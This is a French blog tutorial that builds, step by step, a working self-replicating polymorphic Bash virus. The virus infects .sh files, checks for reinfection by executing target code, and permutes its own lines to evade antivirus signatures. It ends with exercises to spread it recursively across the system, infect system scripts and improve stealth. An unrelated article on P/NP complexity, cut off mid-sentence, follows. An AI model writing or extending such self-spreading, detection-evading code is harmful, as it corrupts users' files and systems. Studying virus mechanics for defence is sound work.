contentons-nous d'une petite introduction sur les virus Unix où nous aurons l'occasion de coder notre premier virus ! Je pense en effet que ce qui est excitant avec ce domaine, outre le fait qu'il soit perçu comme obscur, c'est qu'il est possible de bien s'amuser en bidouillant un peu et en se servant concrètement de son ordinateur. Bref, nulle théorie ne sera abordée dans ce premier article bien que je n'exclus pas l'idée d'en parler dans de prochains billets mais cela ne nous empêchera pas de commencer les choses sérieuses (de manière spontanée, j'ai l'impression qu'on peut aller très loin dans la pratique de la virologie sans connaître une once de théorie derrière, la pratique et la théorie me semblant être assez décorrélées). Je tiens à préciser que vous pouvez exécuter tous les codes présents ici sans aucune crainte (exécutez-les cependant dans un dossier de tests, isolé du reste), ils ne sont pas malveillants (cet article ayant avant tout un but pédagogique). Lire l'article avec un Shell à côté serait même une très bonne idée pour assimiler ce qui va suivre et bien comprendre les choses (en vous amusant). Ne vous étonnez pas si l'exécution d'un code échoue parfois, lisez l'article ! Définition et implémentation d'un virus Principes fondamentaux d'un virus Conception d'un virus plus évolué Non-surinfection Polymorphisme Bilan et améliorations Définition et implémentation d'un virus Avant de voir du code et de passer à la pratique, quelques petites notions de base en virologie s'imposent. Commençons par le commencement, qu'est-ce qu'un « virus » ? Un virus, c'est tout simplement un automate auto-reproducteur . En bref, c'est juste un programme qui va se reproduire lui-même au fil de ses multiples exécutions. Il est intéressant de noter qu'un virus n'est donc fondamentalement pas nocif et malveillant comme on le conçoit d'ordinaire. Cela dit, quand il est exécuté sur un fichier dit infecté , il va se propager de fichier en fichier, s'auto-reproduisant pour finalement infecter tout le système puis passer à d'autres systèmes non infectés. On peut donc dès à présent coder un tout petit virus minimaliste. Il s'agit d'un programme qui va s'auto-reproduire de cible en cible, i.e. qui va dupliquer son propre code source sur tous les fichiers infectés. Les fichiers exécutables en .sh constituent une bonne cible de départ. En effet, ayant déjà des droits d'exécution, on peut donc les infecter par un code qui s'exécutera sans aucun soucis lié aux permissions. En utilisant la commande tail on peut donc écrire par exemple : for f in *.sh ; do tail -n 3 $0 >> $f done Reste à savoir si c'est un virus efficace… Principes fondamentaux d'un virus Maintenant qu'on a vu succinctement ce qu'est un virus, touchons trois mots à propos des antivirus (cela justifiera d'autant plus la suite de l'article). De manièrement informelle, on peut voir un antivirus comme un programme qui scanne le système de temps en temps et qui surveille de manière continue les points stratégiques (ports TCP et cie). Ce programme est chargé de trouver des anomalies qui pourraient révéler la présence de virus. Par exemple, notre précédent virus va infecter tous les fichiers en .sh du système en leur dupliquant son code source. L'antivirus, en scannant par exemple ces fichiers, va s'apercevoir qu'un motif récurrent apparaît. Il va consulter sa base de données et ainsi détecter la présence du dit virus. Autre exemple, l'exécution d'un programme alloue étrangement trop de mémoire ou prends trop de temps. L'antivirus va scanner en particulier le code de ce programme et trouvera sans doute le virus, au moyen toujours de sa base de données. Bien que simplistes, ces exemples donnent de petites idées sur le fonctionnement d'un antivirus. Ainsi, afin d'assurer une bonne auto-reproduction, il existe trois concepts fondamentaux qui régissent le fonctionnement d'un virus afin que ce dernier ne se fassent pas trop vite repérer par un antivirus. À savoir : La non-surinfection : le virus ne doit pas infecter un fichier déjà infecté ! Si tel était le cas, on aurait des boucles infinies allouant quantité de mémoire et notre virus se ferait très vite détecter (en plus de ne pas fonctionner). Le polymorphisme : le virus doit changer de forme au cours de son auto-reproduction afin de ne pas constituer une signature fixe exploitable par un antivirus. Si il doit changer de forme, il ne doit surtout pas changer de fond ! Chaque auto-reproduction doit donc être équivalente bien que différente en apparence ! La furtivité : le virus doit passer inaperçu aux yeux d'un antivirus et de son utilisateur ! Les deux premiers concepts sont abordés dans cet article, le troisième pourrait constituer un article futur. Reprenons notre premier virus précédent et regardons si il vérifie les concept énoncés ci-dessus. Notre virus lutte-t-il contre la surinfection ? Non, un fichier cible déjà infecté se verra encore infecter si notre virus est exécuté. Notre virus est-t-il polymorphe ? Non plus, il est rigoureusement le même au fil des auto-reproductions. Et est-t-il furtif ? Je ne crois pas, son code source apparaissant en clair ! Bref, notre premier virus minimaliste est bien un virus mais il se fera très très vite attraper par le premier antivirus passant par-là... Basons-nous sur cet exemple minimaliste pour construire un virus plus évolué au fil de l'article, en enrichissant nos trois lignes de code et surtout, en essayant de respecter les deux premiers principes vus ci-dessus ! Conception d'un virus plus évolué Commençons donc par nous interroger sur la question de la non-surinfection ! Non-surinfection Il s'agit donc de détecter la présence de notre virus dans un fichier cible afin de ne pas le ré-infecter. La première approche qui nous vient en tête est sans doute celle de la vérification par clé. En bref, une simple clé attesterai de la présence ou non du virus. Quelque chose dans l'esprit de : if [ -z $( grep nkoazdpokdaznojazd cible.sh ) ] ; then continue fi ... Cependant cette méthode, bien que simple et très efficace pour la non-surinfection (on peut être certain que le virus ne sera pas dupliqué dans un fichier déjà infecté et ce, même si le virus se situe n'importe où) n'est pas du tout pertinente. Les antivirus ont un fonctionnement de base qui s'appuie sur des signatures fixes . Ils « lisent » l'infection proprement dite d'un virus, regardent les éléments qui demeurent constants au fil des reproductions du virus et les utilisent par la suite pour reconnaître le virus (via des fonctions de hashage et de grosses bases de données). Autrement dit, si un virus souhaite passer entre les mailles de ce premier filet, il ne doit pas laisser de signatures fixes dans ses infections ! Or notre clé de reconnaissance est justement une signature fixe… Bref, vous l'aurez compris, cette idée n'est pas satisfaisante pour notre projet. Une autre méthode consisterait à chercher le code source exact du virus dans le fichier cible afin de vérifier sa présence mais c'est exactement la même idée que celle ci-dessus (modulo le fait que la clé devient plus longue, ce qui ne nous avance guère). Il y a maintenant une solution plus élégante que celle proposée ci-dessus et surtout beaucoup plus efficace contre l'utilisation des signatures fixes par un antivirus. Il s'agit d'exécuter les X dernières lignes du fichier cible et d'observer le code de retour : si tout va bien, on obtient un exit 0 et sinon une erreur (qu'on peut faire taire en redirigeant vers /dev/null ). L' exit 0 témoigne de la présence du virus (qui est donc exécuté) et l'erreur, de son absence. Cela dit, cette idée fait quand même l'approximation que les X dernières exécutées renverront bien une erreur en cas d'absence du virus (ce qui peut ne pas être le cas dans la pratique, bien évidemment (X lignes constituées d'instructions comme echo … par exemple renverront un exit 0 )). On pourra donc au préalable compter le nombre de lignes du fichier cible et si il est inférieur à celui de notre virus, directement infecter ce fichier (qui ne contient donc forcément pas notre virus). Et si notre fichier cible contient plus de X lignes, c'est que les X dernières lignes sont en théorie dépendantes des lignes précédentes et donc que leur exécution renverra une erreur. Cette technique fonctionne donc a priori puisque l'antivirus n'a aucune signature fixe sur laquelle baser sa défense, la vérification de la non-surinfection se faisant dynamiquement, par exécution de code. Notre virus contiendra donc dans un premier temps un petit test afin de savoir si l'exécution du fichier à infecter est effectuée pour vérifier la non-surinfection, en faisant par exemple ./cible.sh test (l'argument test attestera de notre demande de vérification) : if [ \" $1 \" == \"test\" ] ; then exit 0 fi Puis dans un deuxième temps, on effectue le comptage de lignes du fichier cible comme décrit précedemment et ce, grâce à la fonction wc et cut puis on opère en fonction du résultat (par rapport à la longueur X de notre virus donc). Dans le cas où on doit tester les X dernières lignes, on récupère celle-ci via la fonction tail, on redirige le résultat dans un fichier nommé virus puis on exécute celui-ci en regardant la sortie. Un exit 0 provoquera un changement de cible, celle courante étant donc déjà infectée : nbrlines = ` wc -l $f | cut -f1 -d ' ' ` if [ $nbrlines -gt 16 ] ; then tail -n X $cible > virus chmod +x virus ./.virus test > /dev/null 2 > & 1 && continue fi Les opérateurs de logique sont ici bien adaptés afin de connaître le code de retour d'une exécution. Pour un cmd > /dev/null 2>&1 && cmd1 || cmd2 , cmd1 sera exécutée si et seulement si cmd renvoie un exit 0 et cmd2 si et seulement si cmd échoue (et par ailleurs, cmd ne redirigera aucun résultat sur la sortie standard). Maintenant que nous savons gérer de manière un peu plus correcte notre gestion de la non-surinfection, intéressons-nous au polymorphisme de notre virus ! Polymorphisme L'objectif de cette partie est de rendre théoriquement invisible l'auto-reproduction du virus aux yeux d'un antivirus. Il ne s'agit pas de modifier intrinsèquement notre virus mais de le modifier dans la forme, en apparence, de façon à ce qu'il soit strictement équivalent à chaque reproduction. Après plusieurs réflexions, le concept de code mutant me paraît être assez efficace : le code source du virus va muter en se propageant de fichier en fichier. Il suffit par exemple d'effectuer une permutation aléatoire du code source de propagation en propagation afin de mettre en oeuvre cette mutation. (N'hésitez pas à me proposer vos idées de concepts de polymorphisme.) Comment implémenter ce comportement en pratique ? Un obstacle se pose dès le départ, comment assurer la bonne exécution du virus si son code est permuté de façon aléatoire au fil de sa propagation ? Instinctivement, on se dit avoir besoin d'une fonction qui appliquera la permutation inverse au code lors de son exécution afin que toutes les instructions se déroule dans le bon ordre. Mais cette fonction appartient à notre virus, elle sera a priori elle-même permutée avec le reste du code. Mais pourquoi donc la permuter ? Fixons-là au début de notre virus et permutons le reste du code en dessous ! Mais cette fonction apparaîtra donc comme une signature fixe au yeux d'un antivirus… Après ces quelques réflexions, le polymorphisme semblerait être au final un problème épineux. Il va nous falloir ruser pour contourner les quelques problèmes énoncés ci-dessus mais notre idée de base (permutation aléatoire du code du virus) est cependant bien la bonne, je vous rassure. Essayons dans un premier temps d'implémenter notre polymorphisme de base : le virus va effectuer une permutation aléatoire de son code à chaque reproduction et une fonction placée en en-tête s'assurera de la permutation inverse afin d'exécuter le virus. On serait tenté de vouloir utiliser la fonction sort de base afin de ne pas ré-inventer la roue. C'est une bonne idée car elle facilite vraiment beaucoup la gestion de ces permutations. Un man sort vous permettra de vous renseigner sur les différents arguments possibles et il se trouve que certains d'entre eux nous intéressent ! Un sort -R virus.sh va par exemple permuter aléatoirement le code de notre virus ! Mais comment appliquer la permutation inverse puisque la permutation initiale étant aléatoire, on ne la connait pas ? Le terme même de \"sort\" devrait vous aiguiller, on va trier le code source de notre virus à l'aide de sort ! Sans argument, sort triera tout notre code en fonction du premier caractère de chaque ligne, ça n'est pas très intéressant. L'astuce est donc de forcer sort à trier notre code de façon numérique mais pour cela il nous faut des nombres dans notre code. Merveilleuse existence des commentaires ! On va numéroter chaque ligne de notre virus à l'aide des commentaires, quelque chose comme : # @7 pour la septième ligne, par exemple. Il nous suffira ensuite d'appliquer un sort -R virus.sh pour permuter aléatoirement notre virus, comme expliqué précedemment, puis un sort -n -t@ -k2 virus.sh pour remettre en place notre virus ( -n signifie qu'on trie numériquement, -t indique le séparateur qu'on utilise pour indiquer les nombres à utiliser et -k sélectionne le côté de la séparation qui nous intéresse (appliquer un -t@ coupera # @7 en deux, d'un côté # , de l'autre 7 (c'est donc le deuxième côté qui nous intéresse))). Commençons un peu à coder (sans nous préoccuper d'intégrer maintenant notre code de non-surinfection) : tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus for f in *.sh ; do # @1 echo 'tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus' >> $f # @2 tail -n 4 $0 | sort -R >> $f # @3 done # @4 Je n'ai pas grand chose à ajouter, la première ligne constitue notre fonction qui va remettre en ordre le code du virus au-dessous d'elle (qui est potentiellement permuté) puis l'exécuter. Le virus va ensuite, pour chaque cible en .sh , ajouter cette fonction au fichier à infecter puis ajouter les quatre dernières lignes de son code, permutées par sort. Voici un fichier cible d'exemple : echo 'Ceci est un fichier infecté. :(' L'exécution de notre virus précédent va infecter ce fichier cible comme cela, par exemple : echo 'Ceci est un fichier infecté. :(' tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus echo 'tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus' >> $f # @2 done # @4 tail -n 4 $0 | sort -R >> $f # @3 for f in *.sh ; do # @1 (Et l'exécution de ce fichier infecté va suivre le comportement décrit juste ci-dessus.) Afin d'améliorer notre polymorphisme, il serait intéressant de permuter la position de la première ligne (la fonction de permutation inverse) en même temps que le reste du code. Cela pose cependant un gros problème, comment appliquer alors la permutation inverse ? La solution se trouve encore… dans les commentaires ! Eh oui, en commentant tout le virus sauf la fonction de permutation inverse, on peut permuter à souhait le code entier et son exécution commencera donc forcément par notre fonction de permutation inverse (puisque le reste du code est un commentaire). Il faudra simplement décommenter notre code en le triant puis l'exécuter. On va utiliser ici les commandes sed et cut pour respectivement commenter et décommenter notre code. Le commenter est plus délicat car il s'agit de rajouter # à chaque début de ligne. C'est ici que rentre en jeu la très puissante commande sed qui, en quelques mots, manipule des fichiers ligne par ligne selon les instructions de l'utilisateur (le plus souvent sous forme de regex). Je vous laisse consulter le manuel, notre utilisation se résumant à un sed -i \"s/&#94;/# /\" (l'argument -i indique l'ajout de caractères à une ligne et la regex s/&#94;/# indique qu'on rajoute # à chaque début de ligne ( &#94; )). La commande cut va s'utiliser avec l'argument -c qui indique qu'on considère notre code comme un tableau auquel on choisit les colonnes à afficher. En commentant, on ajoute un dièse et un espace (colonne 1 et 2), on va donc sélectionner tout le code à partir de la colonne 3 ce qui se fait comme ceci : cut -c3- virus . Il faut enfin changer la position de la première ligne dans le fichier cible et ce, toujours avec la commande sed utilisée comme ceci : sed -i \"/POSITION/ i\\PREMIERE LIGNE\" (on insère la PREMIERE LIGNE au-dessus de la POSITION-ième ligne et ce, aléatoirement ; consultez le manuel pour plus de précisions). Modifions un peu notre code précédent : tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 > virus && chmod +x virus && ./virus # for f in *.sh; do # @1 # tail -n 6 $0 | sort -R > infection # @2 # sed -i \"s/&#94;/# /\" infection # @3 # sed -i \"/$[ RANDOM % 7 ] i\\tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 > virus && chmod +x virus && ./virus\" infection #@4 # cat infection >> $f # @5 # done # @6 En exécutant ce code, vous obtiendrez sans doute une erreur vous signifant que « La commande -il n'existe pas. ». « il », « tail », cela se ressemble, non ? Il semblerait que nous ayons fait une erreur de raisonnement. En appliquant la commande cut -c3- au fichier infecté avant le tri des dernières lignes, afin de décommenter le code, on oublie que la fonction de permutation inverse n'est pas commentée et donc qu'on coupe la commande tail en commençant par la colonne 3. Une astuce ? Rajouter deux espaces pour s'aligner sur le code commenté ! (On peut tout aussi bien changer la position de cut -c3- pour la mettre après sort -n -t@ -k2 puisqu'il s'agit en fait de l'ordre des commandes qui n'est pas anodin.) Il y a cependant une autre erreur de raisonnement. En effet, si vous exécutez ce code, il n'infectera aucun fichier. En effet, dans la première ligne nous récupérons le virus entier via tail -n 7 $0 puis nous mettons le code ordonné dans un fichier virus que nous exécutons. Mais le fichier virus exécuté contient exactement la même première ligne que ci-dessus… On va donc toujours rester bloqué à la première ligne. Suffirait-il de modifier le tail -n 7 en tail -n 6 ? Eh non, car notre première ligne peut potentiellement se retrouver ailleurs puisque le code du virus est permuté et il faut donc bien récupérer les 7 lignes (i.e. le virus entier). L'astuce consiste à rajouter un tail -n 6 à la suite. Au final : tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 | tail -n 6 > virus && chmod +x virus && ./virus # for f in *.sh; do # @1 # tail -n 6 $0 | sort -R > infection # @2 # sed -i \"s/&#94;/# /\" infection # @3 # sed -i \"/$[ RANDOM % 7 ] i\\ tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 | tail -n 6 > virus && chmod +x virus && ./virus\" infection #@4 # cat infection >> $f # @5 # done # @6 Il y a cependant, un autre soucis. Eh oui, c'est le problème avec ce genre de programme qui se « mord la queue », à première vue on ne pense pas forcément à toutes les subtilités ! (Remarquez que ça rend la chose d'autant plus intéressante.) A priori, notre virus permuté ne sera jamais trié dans l'ordre convenable. C'est pourtant étonnant, non ? Je ne pense pas avoir dis de bêtises et la commande sort est quand même fiable je suppose. Le problème vient pourtant bien de notre tri. Rappelez-vous, nous trions le code permuté grâce à la commande sort -n -t@ -k2 et @ est donc le séparateur censé précéder le numéro de la ligne courante. Observez bien le code… Le symbole @ est utilisé ailleurs et c'est cela qui perturbe le fonctionnement de notre tri. Arrivé à ce constat, j'avoue avoir été un peu dégoûté, bloqué si proche du but. La solution la plus facile consisterai à représenter le @ d'une autre manière. Merci Bash et sa possibilité d'exécuter des commandes via `` ! Servons nous par exemple de la représentation hexadécimale. @ est encodé par le nombre 40 , il ne reste plus qu'à remplacer les @ intempestifs par des printf \"\\x40\\n\" : tail -n 7 $0 | cut -c3- | sort -n -t ` printf \"\\x40\\n\" ` -k2 | tail -n 6 > virus && chmod +x virus && ./virus # for f in *.sh; do # @1 # tail -n 6 $0 | sort -R > infection # @2 # sed -i \"s/&#94;/# /\" infection # @3 # sed -i \"/$[ RANDOM % 7 ] i\\ tail -n 7 $0 | cut -c3- | sort -n -t`printf \"\\x40\\n\"` -k2 | tail -n 6 > virus && chmod +x virus && ./virus\" infection #@4 # cat infection >> $f # @5 # done # @6 Enfin un code qui fonctionne ! Bilan et améliorations Après avoir bien amélioré notre virus minimaliste de départ qui tenait, je vous le rappelle, en trois lignes, voilà notre virus polymorphe final : tail -n 15 $0 | cut -c3- | sort -n -t ` printf \"\\x40\\n\" ` -k2 | tail -n 14 > virus && chmod +x virus && ./virus # if [ \"$1\" == \"test\" ]; then # @1 # exit 0 # @2 # fi # @3 # for f in *.sh; do # @4 # nbrlines=`wc -l $f | cut -f1 -d' '` # @5 # if [ $nbrlines -gt 14 ]; then # @6 # tail -n 15 $f | cut -c3- | sort -n -t`printf \"\\x40\\n\"` -k2 | tail -n 14 > test && chmod +x test # @7 # ./test test > /dev/null 2>&1 && continue # @8 # fi # @9 # tail -n 14 $0 | sort -R > infection # @10 # sed -i \"s/&#94;/# /\" infection # @11 # sed -i \"/$[ RANDOM % 15 ]/ i\\ tail -n 15 $0 | cut -c3- | sort -n -t`printf \"\\x40\\n\"` -k2 | tail -n 14 > virus && chmod +x virus && ./virus\" infection #@12 # cat infection >> $f # @13 # done # @14 Nous nous arrêterons là mais voici quelques améliorations possibles afin de vous exercez tout seul : On utilise des fichiers intermédiaires virus , test et infection afin d'ordonner le code permuté du virus présent dans un fichier infecté, l'exécuter et reproduire le virus (car sed a notamment besoin qu'on lui passe un fichier en argument). Ce n'est pas très discret, vous pourriez améliorer cela (petite indication : servez-vous de /tmp/). Notre virus n'infecte que les fichiers du répertoire courant. Essayez d'étendre ce comportement afin d'explorer récursivement tout le système ! Notre virus n'infecte que les fichiers en .sh , il serait t'intéressant d'étendre son infection aux scripts du système. Vous pouvez aussi vous amuser à jouer avec la furtivité du virus : essayez d'accélérer son fonctionnement (en utilisant le moins d'écriture disque intermédiaire possible) afin de rendre son exécution la brève possible et donc de passer plus inaperçu en cas de traitement de milliers de fichiers. Vous pouvez au contraire rendre son exécution beaucoup plus lente afin d'améliorer sa survie, etc. Au fil de cet article, nous avons pu étudier un peu deux des trois principaux concepts qui régissent les virus et ce, en aboutissant à un petit virus polymorphe. Afin de comprendre en profondeur tous les codes qui se trouvent dans cet article (si vous avez un peu de mal), il me paraît essentiel de pratiquer un peu afin de vous rendre compte vous-même des problèmes pratiques que peut poser le polymorphisme, par exemple, et des solutions que vous pouvez trouver pour les résoudre. N'hésitez pas à partager vos expériences dans les commentaires ! Certains d'entre vous seront peut-être déçus par cette modeste introduction qui présente des principes généraux à la base des virus mais dans le cas un peu particulier d'une implémentation en Bash. Je vous avoue que je n'ai pas encore réfléchi en profondeur au problème du polymorphisme, par exemple, dans le cas général. Intuitivement, je dirai qu'il faudrait se pencher sur la théorie afin de pouvoir traiter ce cas général. Peut-être faut-il également s'intéresser aux quines multi-langages, qui paraît être une voie intéressante (puisque mine de rien, on utilise un quine en Bash qu'on permute par la suite). Bref, je compte m'intéresser à cette question et peut-être que je rédigerai un prochain article sur le sujet. Pour l'heure, je pense encore avancer en développant un peu plus notre virus (notamment en m'intéressant à la furtivité du virus et à sa charge utile (nous en reparlerons)) et en faire un prochain billet. Cet article est issu de mon blog , retrouvez-y des articles bonus et autres joyeusetés ! Suivez-moi sur Twitter afin d'être tenu au courant des derniers articles."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/reflexion-sur-la-complexite-algorithmique","title":"Réflexion sur la complexité algorithmique","text":"L'article qui suit présuppose quelques notions basiques d'algorithmique et de calcul de complexité (temporelle). Il vise à aborder deux grandes erreurs commises par les novices dans ces domaines et à en constater les effets. Une première partie sera dédiée à une erreur classique d'évaluation de la classe de complexité d'un problème à partir de la complexité calculée d'un algorithme, ce qui aura des conséquences désastreuses en terme de performances. La seconde partie présentera une erreur liée à l'erreur d'évaluation directe de la classe de complexité d'un problème, qui va cette fois avoir des conséquences sur la manière d'aborder un problème pour tenter de le résoudre. Les notions utiles à la compréhension de cet article seront expliquées dans une première partie et la totalité des démonstrations sera omise (mais on peut évidemment grassement payer l'auteur pour qu'il les fasse sur le forum). Rappels sur la complexité temporelle Complexité en temps Réduction polynomiale et classes d'équivalence En résumé Erreur 1 : Évaluation de la complexité d'un algorithme Le propos Exemple : Nombre composé En résumé Erreur 2 : Erreur sur la classe d'un problème Le propos Exemple : SAT Exemple : Arbre couvrant de poids minimal Conclusion Rappels sur la complexité temporelle Complexité en temps Il est coutume que de manière informelle, on enseigne aux novices de l'algorithmique que la complexité d'un algorithme correspond au nombre d'étapes (élémentaires) de l'algorithme, qui est fonction de la taille des données du problème. Cette définition a l'avantage d'être très facile à appliquer, facilement compréhensible et de donner une borne assez fidèle dans la plupart des applications. Cependant, cette définition est problématique, comme nous allons le voir, lorsque l'on donne la définition formelle des classes d'équivalence de complexité algorithmique. On présente souvent les classes de complexité principales : $P$ et $NP$, respectivement pour Polynomial et Non- Déterministe Polynomial . Le terme « non déterministe » est important puisqu'à l'heure actuelle, nous ne savons pas si $P = NP$ (et pour l'anecdote, il s'agit d'un des problèmes du prix du millénaire, récompensé par la coquette somme d'un million de dollars par le Clay Mathematical Institute ). De manière formelle, un algorithme $A$ de machine de Turing déterministe est polynomial s'il existe un polynôme $p_A$ tel que $\\forall x \\in \\Sigma&#94;*, |x|=n, t_A(x) \\leq p_A(n)$ où $x$ est un mot de l'alphabet $\\Sigma$ (ensemble des symboles différents pour coder l'entrée), $t_A(x)$ le nombre de pas jusqu'à l'arrêt de $A$ et $n$, la longueur de l'entrée, qui est arbitrairement fixée. On appelle complexité en temps de $A$, le maximum des $t_A(x)$ pour un $n=|x|$ fixé. On comprend donc aisément qu'un algorithme est polynomial si sa complexité temporelle est bornée par un polynôme. Par extension, on dira qu'un problème $\\Pi$ est polynomial s'il existe un algorithme $A$ polynomial qui résout $\\Pi$. Cette définiton est excessivement formelle et oblige à recourir aux machines de Turing. Cependant, il existe toujours des fonctions permettant de passer d'un formalisme en machine de Turing à un formalisme utilisant nos ordinateurs modernes, le tout, évidemment, en temps polynomial. Ainsi, par la suite, on ne reviendra jamais aux machines de Turing pour calculer des complexités, et heureusement ! Est-ce qu'un algorithme qui n'est pas dans $P$ est dans $NP$ ? C'est une question que l'on retrouve assez souvent et la réponse est évidemment non. Il suffit de se référer à la définition formelle d'un algorithme non-déterministe polynomial. Pour cela, nous devons introduire la notion de certificat et de vérification . Un certificat est une aide permettant, pour une entrée donnée, de déterminer si $x$ est reconnu par un algorithme $A$. De manière conceptuelle, il peut être vu comme une intervention divine ou une indication, comme en donnerait un professeur lors d'un examen, pour guider l'étudiant à démontrer un résultat difficile. La vérification est un algorithme permettant de savoir si l'entrée est reconnue sachant le certificat. On dira qu'un algorithme $A$ est non-déterministe polynomial s'il existe un polynome $p_A$ tel que $\\forall x \\in \\Sigma&#94;n$, $t_A(x) \\leq p_A(n)$ où $t_A(x)$ est le temps de reconnaissance de $x$ (c'est à dire le temps minimal de reconnaissance de $x$ parmi l'ensemble des temps de reconnaissance de $x$, qui peuvent varier selon le certificat). De même, un problème $\\Pi$ est non-déterministe polynomial s'il existe un algorithme $A$ non-déterministe polynomial qui résout $\\Pi$. Réduction polynomiale et classes d'équivalence Une dernière partie théorique permettant d'introduire la notion de réduction polynomiale et ainsi la notion de classes de complexité , de manière plus formelle. Soient $\\Pi_1$ et $\\Pi_2$, deux problèmes de décision. On dit que $\\Pi_1$ se réduit polynomialement en $\\Pi_2$ noté $\\Pi_1 \\propto \\Pi_2$ s'il existe une fonction $f:D_{\\Pi_1} \\rightarrow D_{\\Pi_2}$ telle que : $f$ est calculable polynomialement $I\\in Y_{\\Pi_1} \\Leftrightarrow f(I)\\in Y_{\\Pi_2}$ Où $D_{\\Pi_1}$ et $D_{\\Pi_2}$ sont, respectivement, les instances possibles (entrées possibles) pour le problème $\\Pi_1$ et $\\Pi_2$ et $Y_{\\Pi_1}$, l'ensemble des instances de $\\Pi_1$ renvoyant VRAI au problème de décision. Par exemple, on peut considérer le problème de savoir si un entier $n$ donné est pair. L'ensemble des données possibles en entrée est l'ensemble des entiers. L'ensemble renvoyant VRAI est, évidemment, l'ensemble des nombres pairs. Cette relation possède quelques propriétés intéressantes mais ce n'est pas le propos de cet article. Par contre, il s'agit d'une relation d'ordre partiel sur l'ensemble des problèmes de décision, à laquelle on peut ajouter une notion de symétrie permettant de construire une relation d'équivalence, et par là même, définir des classes d'équivalence au sens de cette relation. La classe $P$ est la plus petite classe au sens de cette relation et la classe $NP$-complet est la plus grande. Enfin, pour éclaircir le vocabulaire. On parle de problème $NP$-difficile dans le cadre des problèmes de décision. Cela signifie qu'un problème est aussi difficile que les problèmes de la classe $NP$-complet. En résumé Que faut-il retenir de cette introduction très formelle ? Un problème $\\Pi$ est polynomial s'il existe un algorithme $A$ polynomial qui résout $\\Pi$. un problème $\\Pi$ est non-déterministe polynomial s'il existe un algorithme $A$ non-déterministe polynomial qui résout $\\Pi$. $P \\subseteq NP$. Tous les problèmes d'une classe donnée sont équivalents (au sens de la réduction polynomiale). Erreur 1 : Évaluation de la complexité d'un algorithme Le propos Rappelez-vous de la définition formelle de la complexité temporelle. Que ce soit pour l'ensemble $P$ ou $NP$ nous avons l'inégalité suivante : $t_A(x) \\leq p_A(n)$ où $x$ est un mot de l'alphabet $\\Sigma$ (ensemble des symboles en pour coder l'entrée), $t_A(x)$ le nombre de pas jusqu'à l'arrêt de $A$, $n$, longueur de l'entrée est arbitrairement fixé et $p_A(n)$, un polynôme fonction de $n$. C'est bien ici qu'est le propos de cette première erreur : le polynôme qui borne le temps d'éxécution n'est pas fonction de l'entrée mais de la taille de codage ou d'écriture du problème. Quelle différence ? Voyons sur un exemple très simple. Exemple : Nombre composé Un nombre est composé s'il n'est pas premier. Donnons nous le problème de décision suivant : Soit un entier n. Est-il composé ? Un algorithme naïf serait le suivant : Pour i = 2 à $\\sqrt{n} faire Si $n \\mod i = 0$ alors Retourner Vrai Fin pour Retourne Faux La question à se poser est : quelle est la complexité de cet algorithme ? Au premier coup d'œil, nous parcourons une boucle dans laquelle nous effectuons une opération plus ou moins élémentaire. Bref, il semblerait que cet algorithme soit en $O(n)$ voire $O(n&#94;{\\frac{1}{2}})$ si nous voulions être plus précis. Dans les deux cas, un joli polynôme. Notre problème est donc un problème polynomial. Ce calcul est évidemment bon mais la conclusion est fausse, pour la raison évoquée : elle ne tient pas compte de la taille d'écriture du problème. Quelle est donc la taille d'écriture de ce problème ? Nous avons un entier $n$ quelconque. Quelque soit la base $b$ dans laquelle il est exprimé, sa longueur d'écriture est $\\left\\lfloor{log_bn}\\right\\rfloor + 1$, c'est à dire partie entière inférieure du logarithme en base $b$ de $n$ plus une unité. Ainsi, le polynôme cherché est un polynôme fonction de $O(log n)$. $O(n&#94;{\\frac{1}{2}})$ n'est pas borné par un polynôme en $O(log n)$, ce qui fait que notre algorithme n'est PAS polynomial. Attention toutefois, cela n'exclut pas que le problème soit polynomial (qu'il existe un algorithme polynomial pour le résoudre), mais ce ne sera pas celui-ci. Une bonne pratique consiste à vérifier qu'il est au moins dans la classe $NP$ et ensuite d'essayer de montrer qu'il est dans $P$ ... s'il est dans $P$. Au vu de la définition formelle de la section précédente, il suffit de trouver un bon certificat qui permette de trouver un algorithme en temps polynomial en fonction de la taille d'écriture du problème. On peut simplement prendre deux entiers $a$ et $b$ comme certificat et cet algorithme de vérification : Si $a*b=n$ alors Retourner Vrai Dans la vérification, on ne s'intéresse qu'à savoir si $x$ est vérifié, comme son nom l'indique. Nous avons bien un algorithme qui est cette fois borné par un polynôme et donc notre problème admet un algorithme de la classe $NP$ qui le résout. Il s'agit donc d'un problème $NP$. Pour la petite histoire, ce problème est effectivement dans la classe $P$. Le co-problème associé est le test de primalité, dont la preuve de l'appartenance à la classe $P$ n'a été trouvée qu'en 2002, avec les algorithmes AKS (au pluriel car de nombreuses variantes se sont développées). Ne vous inquiétez pas, cela ne suffit cependant pas à casser RSA. En résumé Ainsi s'achève cette première partie qui consistait à pointer du doigt un piège courant de l'évaluation de la classe de complexité d'un algorithme. La conclusion à en tirer est que la notion de complexité est certe relative au nombre d'étapes d'un algorithme, mais elle représente surtout une garantie que si la taille du problème augmente, le temps de calcul n'explose pas. Erreur 2 : Erreur sur la classe d'un problème Le propos Lorsque l'on est face à un problème d'optimisation combinatoire ou de décision (les deux ensembles de problèmes sont équivalents), on procède généralement de la sorte : Trouver un modèle mathématique du problème (hypothèses, données, limites du modèle) Déterminer à quelle famille se rattache ce problème. Déterminer ou concevoir un algorithme de résolution du problème. Une technique usuelle est de se ramener à un problème modèle, dont on connait d'une part la classe mais d'autre part des algorithmes de résolution plus ou moins efficaces. Une erreur classique est de confondre énoncé et donnée. Cette distinction est parfois peu perceptible du fait que la formulation du problème va très peu changer, pouvant induire en erreur sur la nature du problème (et potentiellement sa classe de complexité). Exemple : SAT Nous allons à présent parler d'un problème historique de décision. Il s'agit du problème SAT pour Satisfaction de Contraintes Logiques. Voici son énoncé formel : Données : $n$ variables logiques $x_i$ pour $0 \\leq 1 \\leq n$ On appelle $x_i$ et $\\overline{x_i}$ des littéraux. On dispose également de $p$ clauses qui sont un ensemble de littéraux. Exemple de clause : ${x_1,\\overline{x_3},x_8}$. La question est la suivante : existe-t-il une fonction de vérité (c'est à dire une fonction qui à tout $x_i$ va associer une valeur VRAI ou FAUX) 